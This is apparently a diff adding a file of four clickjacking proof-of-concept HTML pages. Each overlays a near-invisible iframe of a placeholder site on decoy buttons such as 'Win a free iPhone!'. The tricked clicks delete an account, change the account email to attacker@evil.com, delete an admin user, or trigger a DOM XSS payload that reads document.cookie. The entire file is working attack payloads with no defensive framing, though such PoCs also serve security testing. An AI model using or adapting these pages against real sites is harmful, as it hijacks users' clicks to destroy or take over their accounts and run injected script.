@@ -1,0 +1,101 @@
+<html>
+  <head><title>Clickjacking PoC</title></head>
+  <body>
+    <style>
+      #target {
+        position: relative;
+        width: 800px;
+        height: 600px;
+        opacity: 0.0001;
+        z-index: 2;
+      }
+      #decoy {
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 800px;
+        height: 600px;
+        z-index: 1;
+      }
+      #decoy button {
+        position: absolute;
+        top: 300px;
+        left: 350px;
+        padding: 10px 20px;
+        font-size: 16px;
+        cursor: pointer;
+      }
+    </style>
+    <div id="decoy">
+      <h1>Win a free iPhone!</h1>
+      <button>Click Here to Claim</button>
+    </div>
+    <iframe id="target" src="https://vulnerable-website.com/account/delete"></iframe>
+  </body>
+</html>
+
+<html>
+  <head><title>Clickjacking with Prefilled Form</title></head>
+  <body>
+    <style>
+      iframe {
+        position: relative;
+        width: 800px;
+        height: 600px;
+        opacity: 0.0001;
+        z-index: 2;
+      }
+      button {
+        position: absolute;
+        top: 320px;
+        left: 380px;
+        z-index: 1;
+        padding: 15px 30px;
+      }
+    </style>
+    <button>Click me</button>
+    <iframe src="https://vulnerable-website.com/settings?email=attacker@evil.com"></iframe>
+  </body>
+</html>
+
+<html>
+  <head><title>Multi-step Clickjacking</title></head>
+  <body>
+    <style>
+      iframe {
+        position: relative;
+        width: 800px;
+        height: 600px;
+        opacity: 0.0001;
+        z-index: 2;
+      }
+      .btn {
+        position: absolute;
+        z-index: 1;
+        padding: 10px 20px;
+      }
+      #btn1 { top: 300px; left: 350px; }
+      #btn2 { top: 350px; left: 350px; display: none; }
+    </style>
+    <button class="btn" id="btn1" onclick="this.style.display='none';document.getElementById('btn2').style.display='block';">Step 1: Click here</button>
+    <button class="btn" id="btn2">Step 2: Confirm</button>
+    <iframe src="https://vulnerable-website.com/admin/delete-user?id=1"></iframe>
+  </body>
+</html>
+
+<html>
+  <head><title>Clickjacking with DOM XSS</title></head>
+  <body>
+    <style>
+      iframe {
+        position: relative;
+        width: 800px;
+        height: 600px;
+        opacity: 0.0001;
+        z-index: 2;
+      }
+    </style>
+    <button style="position:absolute;top:300px;left:350px;z-index:1">Click me</button>
+    <iframe src="https://vulnerable-website.com/feedback?name=<img src=x onerror=alert(document.cookie)>&email=test@test.com&subject=test&message=test#feedbackResult"></iframe>
+  </body>
+</html>
